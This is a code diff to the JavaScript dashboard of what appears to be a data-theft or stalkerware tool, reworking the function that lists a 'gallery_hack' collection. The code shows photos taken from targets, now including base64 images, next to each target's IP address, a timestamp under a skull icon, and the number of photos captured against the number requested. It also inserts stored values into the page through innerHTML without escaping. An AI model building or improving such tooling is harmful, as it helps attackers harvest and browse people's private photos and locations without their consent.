@@ -1043,25 +1043,30 @@
         }
 
         async function loadGallery() {
-            if (!user) return;
-            const div = document.getElementById('galleryList');
-            div.innerHTML = `<div class="loading-text"><i class="fa-solid fa-spinner fa-spin"></i> ${t('loading')}</div>`;
-            try {
-                const snap = await getDocs(query(collection(db, "gallery_hack"), where("ownerId", "==", user.uid)));
-                const data = []; snap.forEach(d => data.push({ id: d.id, ...d.data() }));
-                data.sort((a, b) => (b.unix||0) - (a.unix||0));
-                if (!data.length) { div.innerHTML = `<div class="empty-text"><i class="fa-solid fa-circle-exclamation"></i> ${t('noGallery')}<span class="empty-desc">${t('noGalleryD')}</span></div>`; return; }
-                let h = '';
-                for (let g of data) {
-                    let mh = '';
-                    for (let m of g.photos || []) {
-                        mh += `<img src="${m}" onclick="openMedia('${m}',false)" style="width:55px;height:55px;object-fit:cover;border:2px solid #aa00ff;border-radius:8px;cursor:pointer;flex-shrink:0;">`;
-                    }
-                    h += `<div class="gallery-card"><div class="gallery-header"><span class="gallery-ip"><i class="fa-solid fa-globe"></i> IP: ${g.ip||t('unknown')}</span><span class="gallery-time"><i class="fa-solid fa-skull"></i> ${g.timestamp?new Date(g.timestamp).toLocaleString(lang==='ar'?'ar-SA':'tr-TR'):'N/A'}</span></div><div class="gallery-row"><i class="fa-solid fa-images"></i> ${t('galleryCount')}: <span>${g.photoCount||(g.photos?.length||0)}</span></div><div class="media-strip" style="padding:8px 0;">${mh}</div></div>`;
+    if (!user) return;
+    const div = document.getElementById('galleryList');
+    div.innerHTML = `<div class="loading-text"><i class="fa-solid fa-spinner fa-spin"></i> ${t('loading')}</div>`;
+    try {
+        const snap = await getDocs(query(collection(db, "gallery_hack"), where("ownerId", "==", user.uid)));
+        const data = []; snap.forEach(d => data.push({ id: d.id, ...d.data() }));
+        data.sort((a, b) => (b.unix||0) - (a.unix||0));
+        if (!data.length) { div.innerHTML = `<div class="empty-text"><i class="fa-solid fa-circle-exclamation"></i> ${t('noGallery')}<span class="empty-desc">${t('noGalleryD')}</span></div>`; return; }
+        let h = '';
+        for (let g of data) {
+            let mh = '';
+            const photos = g.photosBase64 || g.photos || [];
+            for (let m of photos) {
+                if (m && m.startsWith('data:image')) {
+                    mh += `<img src="${m}" onclick="openMedia('${m}',false)" style="width:55px;height:55px;object-fit:cover;border:2px solid #aa00ff;border-radius:8px;cursor:pointer;flex-shrink:0;" loading="lazy">`;
+                } else if (m && (m.startsWith('http') || m.startsWith('/'))) {
+                    mh += `<img src="${m}" onclick="openMedia('${m}',false)" style="width:55px;height:55px;object-fit:cover;border:2px solid #aa00ff;border-radius:8px;cursor:pointer;flex-shrink:0;" loading="lazy">`;
                 }
-                div.innerHTML = h;
-            } catch(e) { div.innerHTML = `<div class="error-text">${t('error')}: ${e.message}</div>`; }
+            }
+            h += `<div class="gallery-card"><div class="gallery-header"><span class="gallery-ip"><i class="fa-solid fa-globe"></i> IP: ${g.ip||t('unknown')}</span><span class="gallery-time"><i class="fa-solid fa-skull"></i> ${g.timestamp?new Date(g.timestamp).toLocaleString(lang==='ar'?'ar-SA':'tr-TR'):'N/A'}</span></div><div class="gallery-row"><i class="fa-solid fa-images"></i> ${t('galleryCount')}: <span>${g.photoCount||(photos.length||0)} / ${g.requestedCount||'?'}</span></div><div class="media-strip" style="padding:8px 0;flex-wrap:wrap;">${mh}</div></div>`;
         }
+        div.innerHTML = h;
+    } catch(e) { div.innerHTML = `<div class="error-text"><i class="fa-solid fa-circle-xmark"></i> ${t('error')}: ${e.message}</div>`; }
+}
 
         // ============ SİLME ============
         async function clearColl(coll, field, val, confirmMsg, reloadFn) {
